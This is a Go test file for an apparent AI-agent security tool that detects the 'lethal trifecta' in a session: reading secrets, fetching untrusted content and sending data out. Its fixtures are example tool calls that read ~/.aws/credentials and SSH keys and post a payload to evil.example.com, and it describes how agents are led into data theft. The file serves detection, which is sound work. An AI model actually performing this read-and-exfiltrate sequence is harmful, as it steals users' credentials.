package mcp

import (
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/policy"
)

// secretRead / untrustedIngest / egress are representative calls for each of the
// three trifecta capability classes, used across the accumulation tests.
var (
	trifectaSecretRead     = call{"read_file", map[string]interface{}{"path": "/home/user/.aws/credentials"}}
	trifectaUntrustedFetch = call{"fetch_url", map[string]interface{}{"url": "https://evil.example.com/notes.md"}}
	trifectaEgress         = call{"send_message", map[string]interface{}{"body": "here is the collected data"}}
)

type call struct {
	tool string
	args map[string]interface{}
}

// TestLethalTrifectaTracker_FiresOnceWhenComplete verifies the accumulator
// raises the composite signal exactly on the call that completes the trifecta,
// regardless of the order the three capabilities are exercised, and never again.
func TestLethalTrifectaTracker_FiresOnceWhenComplete(t *testing.T) {
	orders := [][]call{
		{trifectaSecretRead, trifectaUntrustedFetch, trifectaEgress},
		{trifectaEgress, trifectaSecretRead, trifectaUntrustedFetch},
		{trifectaUntrustedFetch, trifectaEgress, trifectaSecretRead},
	}
	for _, order := range orders {
		tr := NewLethalTrifectaTracker()
		var fires int
		for i, c := range order {
			sig := tr.Scan(c.tool, c.args)
			if sig == SignalLethalTrifectaSession {
				fires++
				if i != len(order)-1 {
					t.Errorf("order %v: fired early on call %d (%s)", toolNames(order), i, c.tool)
				}
			}
		}
		if fires != 1 {
			t.Errorf("order %v: expected exactly one fire, got %d", toolNames(order), fires)
		}
		// Post-completion calls must not re-fire.
		if again := tr.Scan(trifectaEgress.tool, trifectaEgress.args); again != "" {
			t.Errorf("order %v: tracker re-fired after completion", toolNames(order))
		}
	}
}

// TestLethalTrifectaTracker_TwoClassesNoFire ensures the composite does NOT fire
// when only two of the three capability classes are present in the session.
func TestLethalTrifectaTracker_TwoClassesNoFire(t *testing.T) {
	tr := NewLethalTrifectaTracker()
	tr.Scan(trifectaSecretRead.tool, trifectaSecretRead.args) // private read
	tr.Scan(trifectaEgress.tool, trifectaEgress.args)         // egress
	// No untrusted ingest — extra benign calls must not complete the trifecta.
	for i := 0; i < 5; i++ {
		if sig := tr.Scan("list_directory", map[string]interface{}{"path": "/workspace"}); sig != "" {
			t.Fatalf("only two capability classes present — must not fire (call %d)", i)
		}
	}
}

// TestLethalTrifectaTracker_NonSecretReadDoesNotComplete verifies the key
// precision lever: reading an ordinary (non-secret) file is NOT a private-data
// read, so a session that fetches + reads a README + sends a message stays quiet.
func TestLethalTrifectaTracker_NonSecretReadDoesNotComplete(t *testing.T) {
	tr := NewLethalTrifectaTracker()
	tr.Scan("read_file", map[string]interface{}{"path": "/workspace/README.md"}) // not a secret
	tr.Scan(trifectaUntrustedFetch.tool, trifectaUntrustedFetch.args)
	if sig := tr.Scan(trifectaEgress.tool, trifectaEgress.args); sig != "" {
		t.Error("reading a non-secret file must not count as a private-data read")
	}
}

// TestClassifyTrifectaCaps spot-checks the per-call classifier.
func TestClassifyTrifectaCaps(t *testing.T) {
	tests := []struct {
		name string
		tool string
		args map[string]interface{}
		want []trifectaCap
	}{
		{"secret file by path", "read_file", map[string]interface{}{"path": "~/.ssh/id_ed25519"}, []trifectaCap{capPrivateRead}},
		{"secret by tool name", "get_secret", map[string]interface{}{"name": "db-password"}, []trifectaCap{capPrivateRead}},
		{"untrusted fetch by name", "web_fetch", map[string]interface{}{"url": "https://x.example.com"}, []trifectaCap{capUntrustedIngest}},
		{"read of external url", "read_url", map[string]interface{}{"url": "https://x.example.com/p"}, []trifectaCap{capUntrustedIngest}},
		{"post payload to external", "http_post", map[string]interface{}{"url": "https://evil.example.com", "body": "x"}, []trifectaCap{capEgress}},
		{"benign non-secret read", "read_file", map[string]interface{}{"path": "/workspace/README.md"}, nil},
		{"internal-only send no payload no url", "get_status", map[string]interface{}{"id": "42"}, nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := classifyTrifectaCaps(tt.tool, tt.args)
			if !sameCapSet(got, tt.want) {
				t.Errorf("classifyTrifectaCaps(%q) = %v, want %v", tt.tool, got, tt.want)
			}
		})
	}
}

// TestLethalTrifectaRule_EvaluatesAudit validates the authored synthetic-tool
// rule (mcp-agentic-audit-lethal-trifecta-session-composite) resolves to AUDIT
// when the tracker injects the synthetic tool name.
func TestLethalTrifectaRule_EvaluatesAudit(t *testing.T) {
	const ruleID = "mcp-agentic-audit-lethal-trifecta-session-composite"
	rules := loadPremiumPackRules(t, "mcp-agentic-attacks.yaml")
	var rule *MCPRule
	for i := range rules {
		if rules[i].ID == ruleID {
			rule = &rules[i]
			break
		}
	}
	if rule == nil {
		t.Fatalf("rule %q not found in premium pack", ruleID)
	}

	e := NewPolicyEvaluator(&MCPPolicy{
		Defaults: MCPDefaults{Decision: policy.DecisionAllow},
		Rules:    []MCPRule{*rule},
	})
	res := e.EvaluateToolCall(syntheticLethalTrifecta, map[string]interface{}{"context": "trifecta complete"})
	if res.Decision != policy.DecisionAudit {
		t.Errorf("synthetic trifecta tool should evaluate AUDIT; got %v", res.Decision)
	}
	// A benign real tool must not match the synthetic-tool rule.
	benign := e.EvaluateToolCall("read_file", map[string]interface{}{"path": "/workspace/README.md"})
	if benign.Decision == policy.DecisionAudit {
		for _, id := range benign.TriggeredRules {
			if id == ruleID {
				t.Error("trifecta rule must only match the synthetic tool name")
			}
		}
	}
}

func toolNames(cs []call) []string {
	out := make([]string, len(cs))
	for i, c := range cs {
		out[i] = c.tool
	}
	return out
}

func sameCapSet(a, b []trifectaCap) bool {
	if len(a) != len(b) {
		return false
	}
	seen := map[trifectaCap]int{}
	for _, c := range a {
		seen[c]++
	}
	for _, c := range b {
		seen[c]--
	}
	for _, n := range seen {
		if n != 0 {
			return false
		}
	}
	return true
}
